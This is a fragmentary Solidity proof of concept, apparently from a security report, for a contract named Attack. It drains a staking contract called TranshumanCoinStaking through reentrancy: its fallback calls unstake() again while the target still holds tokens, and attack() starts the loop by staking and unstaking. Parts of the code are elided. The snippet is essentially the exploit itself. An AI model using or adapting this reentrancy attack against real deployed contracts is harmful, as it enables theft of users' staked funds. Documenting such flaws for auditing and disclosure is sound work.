...
contract Attack {
    ...
    TranshumanCoinStaking public etherStore;

    constructor(address _etherStoreAddress, address tokenAddress) {
        etherStore = TranshumanCoinStaking(_etherStoreAddress);
        local=IERC20(tokenAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external  {
        if (local.balanceOf(address(etherStore))>= 10**18) {
            etherStore.unstake();
        }
    }
    ...
    function attack() external  {
        ...
        local.approve(address(etherStore),10000000000000000000000);
        etherStore.stake(60,1000000000000000000000000);
        etherStore.unstake();
    }
